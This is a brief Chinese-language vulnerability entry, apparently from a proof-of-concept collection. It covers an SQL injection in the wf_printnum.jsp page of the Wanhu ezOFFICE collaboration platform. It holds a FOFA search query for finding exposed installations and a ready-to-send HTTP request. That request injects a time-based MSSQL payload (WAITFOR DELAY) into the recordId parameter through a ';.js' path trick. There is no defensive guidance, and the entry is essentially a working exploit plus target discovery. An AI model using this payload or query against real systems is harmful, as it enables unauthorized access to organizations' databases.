## 万户ezOFFICE-wf_printnum.jsp存在SQL注入漏洞

## fofa
```
app="万户ezOFFICE协同管理平台"
```

## POC
```
GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
